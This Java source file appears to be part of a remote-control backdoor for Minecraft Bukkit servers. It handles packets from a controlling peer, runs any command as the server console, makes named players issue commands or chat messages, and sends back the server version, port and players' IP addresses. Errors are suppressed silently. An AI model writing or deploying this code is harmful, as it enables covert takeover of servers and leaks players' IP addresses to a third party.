package me.kutuzov.client;

import me.kutuzov.client.wrapper.BukkitWrapper;
import me.kutuzov.packet.Packet;
import me.kutuzov.packet.bukkit.*;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.InetSocketAddress;

public class KutuzovBukkitPackets {
    private static BukkitWrapper wrapper = new BukkitWrapper();

    public static void handlePacket(ObjectInputStream ois, ObjectOutputStream oos, Packet packet) {
        if(packet instanceof SCBukkitInfo) {
            try {
                oos.writeObject(new CSBukkitInfo(wrapper.getBukkitVersion(), wrapper.getPort()));
            } catch (IOException exception) {
                // exception.printStackTrace();
            }
        } else if(packet instanceof SCBukkitCommand) {
            wrapper.dispatchCommand(wrapper.getConsoleSender(), ((SCBukkitCommand) packet).getCommand());
        } else if(packet instanceof SCBukkitPlayerCommand) {
            SCBukkitPlayerCommand playerCommand = (SCBukkitPlayerCommand)packet;

            wrapper.dispatchCommand(wrapper.getPlayer(playerCommand.name), playerCommand.command);
        } else if(packet instanceof SCBukkitPlayerChat) {
            SCBukkitPlayerChat playerChat = (SCBukkitPlayerChat)packet;

            wrapper.player_chat(wrapper.getPlayer(playerChat.name), playerChat.message);
        } else if(packet instanceof SCBukkitPlayerAddress) {
            try {
                SCBukkitPlayerAddress inPacket = (SCBukkitPlayerAddress)packet;

                Object player = wrapper.getPlayer(inPacket.name);
                if(player == null) {
                    oos.writeObject(new CSBukkitPlayerAddress("PLAYER NOT FOUND!"));
                    return;
                }

                InetSocketAddress address = wrapper.player_getAddress(player);
                if(address == null) {
                    oos.writeObject(new CSBukkitPlayerAddress("ERROR!"));
                    return;
                }

                oos.writeObject(new CSBukkitPlayerAddress(address.getAddress().getHostAddress()));
            } catch (IOException exception) {
                // exception.printStackTrace();
            }
        }
    }
}